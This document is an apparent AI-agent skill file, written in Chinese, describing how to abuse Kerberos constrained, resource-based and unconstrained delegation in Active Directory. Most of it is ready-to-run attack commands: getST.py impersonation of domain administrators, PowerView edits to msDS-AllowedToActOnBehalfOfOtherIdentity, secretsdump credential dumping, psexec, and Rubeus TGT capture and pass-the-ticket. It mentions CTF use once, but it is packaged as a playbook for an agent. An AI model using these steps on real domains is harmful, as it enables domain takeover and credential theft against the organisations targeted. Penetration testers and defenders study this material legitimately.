---
name: constrained-delegation
description: Use when encountering 约束委派攻击 - kerberos约束委派滥用技术，利用s4u2self和s4u2proxy扩展实现服务间认证和权限提升
---

# Kerberos 约束委派攻击

## Info

- **Tags**: kerberos, constrained-delegation, s4u, active-directory, privilege-escalation

---

## 1. 枚举约束委派

```bash
# 使用 Impacket 查找配置了约束委派的用户/计算机
getuser_SPNs.py domain/user:password -dc-ip 10.10.10.1

# BloodHound 查询
MATCH (u:User) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate

# PowerShell 查询
Get-ADObject -Filter 'msDS-AllowedToDelegateTo -ne "$null"' \
  -Properties msDS-AllowedToDelegateTo, trustedToAuthForDelegation
```

---

## 2. S4U2Self + S4U2Proxy 攻击

```bash
# 使用 getST.py 请求服务票据
# 前提: 已获取委派账户的 NTLM Hash 或 TGT

# 步骤1: 使用 S4U2Self 获取目标用户的 ST
getST.py -spn 'cifs/dc01.domain.local' -impersonate 'Domain Admin' \
  -hashes ':NTHASH' 'domain/user'

# 步骤2: 设置票据
export KRB5CCNAME=/path/to/ticket.ccache

# 步骤3: 使用 S4U2Proxy 获取目标服务票据
# getST.py 会自动处理 S4U2Self + S4U2Proxy

# 步骤4: 使用票据访问目标服务
secretsdump.py -k -no-pass dc01.domain.local
```

---

## 3. 基于资源的约束委派攻击

```bash
# 检查哪些用户可以委派到目标计算机
Get-DomainObject -Identity TARGET-PC$ -Properties msds-allowedtoactonbehalfofotheridentity

# 如果有 GenericWrite 权限，配置 RBCD
# 使用 PowerView
$Sid = Get-DomainUser -Identity attacker | select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor `
  -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$Sid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity TARGET-PC$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 使用 getST.py 请求 ST
getST.py -spn 'cifs/TARGET-PC.domain.local' -impersonate 'Administrator' \
  -hashes ':NTHASH' 'domain/attacker'

# 使用票据
psexec.py -k -no-pass domain/TARGET-PC.domain.local
```

---

## 4. 非约束委派利用

```bash
# 枚举非约束委派
Get-ADComputer -Filter 'TrustedForDelegation -eq $true' -Properties TrustedForDelegation
Get-ADUser -Filter 'TrustedForDelegation -eq $true'

# 等待高权限用户认证到非约束委派主机
# 当域管理员登录时，其 TGT 存储在内存中

# 使用 Rubeus 监控 TGT 进入
Rubeus.exe monitor /interval:5 /nowrap

# 导出缓存中的票据
Rubeus.exe dump

# 传递票据
Rubeus.exe ptt /ticket:BASE64_TICKET
```

---

## 5. 使用 Impacket 工具链

```bash
# 列出可委派的服务
python3 ./getuser_SPNs.py domain.local/user:pass

# 请求伪造票据
python3 ./getST.py -spn 'HOST/dc01.domain.local' \
  -impersonate 'Domain Admins' -hashes ':hash' 'domain/user'

# 使用票据
python3 ./secretsdump.py -k -no-pass dc01.domain.local
```

---

## 关键检查点

- 查找 `msDS-AllowedToDelegateTo` 属性
- 查找 `TrustedToAuthForDelegation` 标志
- 检查 RBCD (`msDS-AllowedToActOnBehalfOfOtherIdentity`)
- 注意 CTF 中通常委派账户权限较低，需要提升
